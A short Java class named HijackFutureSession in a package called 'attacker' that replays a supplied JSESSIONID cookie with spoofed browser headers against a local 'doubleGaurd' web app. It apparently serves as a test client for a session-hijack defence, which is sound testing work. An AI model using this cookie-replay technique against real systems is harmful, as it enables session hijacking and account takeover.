/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package attacker;

import java.io.IOException;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.CookieStore;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.protocol.ClientContext;
import org.apache.http.impl.client.BasicCookieStore;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.cookie.BasicClientCookie;
import org.apache.http.params.CoreProtocolPNames;
import org.apache.http.protocol.BasicHttpContext;
import org.apache.http.protocol.HttpContext;
import org.apache.http.util.EntityUtils;

/**
 *
 * @author swapper
 */
public class HijackFutureSession {

    public static String getInfo(String id) {
        String res="";
        try{
        HttpGet request = new HttpGet("http://localhost:8080/doubleGaurd/upgradePre.jsp");

        HttpContext HTTP_CONTEXT = new BasicHttpContext();
        HTTP_CONTEXT.setAttribute(CoreProtocolPNames.USER_AGENT, "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13");
        request.setHeader("Referer", "http://www.google.com");
        request.setHeader("User-Agent", "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13");
        CookieStore cookieStore = new BasicCookieStore();
        BasicClientCookie cookie = new BasicClientCookie("JSESSIONID", id);
        cookieStore.addCookie(cookie);

        HTTP_CONTEXT.setAttribute(ClientContext.COOKIE_STORE, cookieStore);
        HttpClient httpClient = new DefaultHttpClient();
        HttpResponse response = httpClient.execute(request, HTTP_CONTEXT);

        if (response.getStatusLine().getStatusCode() < 200 || response.getStatusLine().getStatusCode() >= 400) {
            throw new IOException("Got bad response, error code = " + response.getStatusLine().getStatusCode());
        }

        HttpEntity entity = response.getEntity();
        if (entity != null) {
            System.out.println(EntityUtils.toString(entity));
            EntityUtils.consume(entity);
        }
        }catch(Exception e){
         res="Request Invalidated At Mapping Model.You Can't Hijack The Session";   
            e.printStackTrace();
        }
        return res;
    }
}
